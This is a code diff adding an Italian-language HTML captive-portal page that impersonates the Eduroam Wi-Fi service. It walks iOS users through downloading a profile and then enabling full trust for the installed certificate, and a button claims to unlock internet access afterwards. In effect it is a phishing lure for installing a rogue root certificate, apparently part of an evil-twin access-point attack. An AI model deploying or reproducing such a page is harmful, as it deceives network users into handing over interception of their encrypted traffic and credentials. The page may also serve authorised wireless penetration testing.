@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Captive Portal Eduroam</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+            padding-top: 80px;
+            margin: 0;
+            font-size: 18px; /* Ingrandito */
+        }
+
+        .container {
+            background-color: white;
+            display: inline-block;
+            padding: 40px; /* Maggiore padding */
+            border-radius: 16px;
+            box-shadow: 0 0 16px rgba(0,0,0,0.25);
+            max-width: 600px; /* Più larga */
+            width: 100%;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .logo {
+            width: 220px; /* Più grande */
+            margin-bottom: 30px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        h2 {
+            color: #003366;
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
+
+        .info {
+            font-size: 18px;
+            color: #333;
+            margin-top: 15px;
+        }
+
+        .btn {
+            margin: 15px auto;
+            padding: 16px 24px;
+            font-size: 18px;
+            color: white;
+            background-color: #003366;
+            border: none;
+            border-radius: 6px;
+            text-decoration: none;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 85%;
+            max-width: 320px;
+            text-align: center;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 16px;
+            color: #666;
+        }
+
+        .guide {
+            text-align: left;
+            margin-top: 30px;
+        }
+
+        .guide h3 {
+            color: #003366;
+            margin-bottom: 12px;
+            font-size: 22px;
+        }
+
+        .guide ol {
+            padding-left: 25px;
+        }
+
+        .guide li {
+            margin-bottom: 12px;
+            font-size: 17px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="eduroam-logo.png" alt="Eduroam" class="logo">
+        <h2>Configurazione Sicura Eduroam</h2>
+        <p class="info">Per connetterti in sicurezza al Wi‑Fi Eduroam, scarica e installa la configurazione per il tuo sistema operativo:</p>
+        
+
+        <div class="guide">
+            <h3>Guida per installare il certificato su iOS</h3>
+            <ol>
+                <li>Apri le <strong>Impostazioni</strong> del dispositivo.</li>
+                <li>Tocca <strong>Profilo scaricato</strong> in cima.</li>
+                <li>Premi <strong>Installa</strong>, poi ancora <strong>Installa</strong> per confermare.</li>
+                <li>Alla fine, tocca <strong>Fine</strong>.</li>
+                <li>Vai su <strong>Impostazioni → Generali → Info → Impostazioni attendibilità certificati</strong>.</li>
+                <li>Attiva il pulsante accanto al certificato appena installato.</li>
+                <li>Quando appare un messaggio di conferma, premi <strong>Continua</strong>.</li>
+            </ol>
+        </div>
+        
+        <a class="btn" href="/certificate_iOS" download onclick="showUnlock()">Download per iOS</a>
+
+        <div id="section_unlock" style="display:block;">
+            <p class="info"><strong>Dopo l'installazione, premi il pulsante per abilitare la connessione.</strong></p>
+            <form method="POST" action="/authorize">
+                <button type="submit" class="btn">Sblocca e Naviga in Internet!</button>
+            </form>
+        </div>
+
+        <p class="footer">Se non riesci a navigare, assicurati di aver installato correttamente i certificati.</p>
+    </div>
+</body>
+</html>
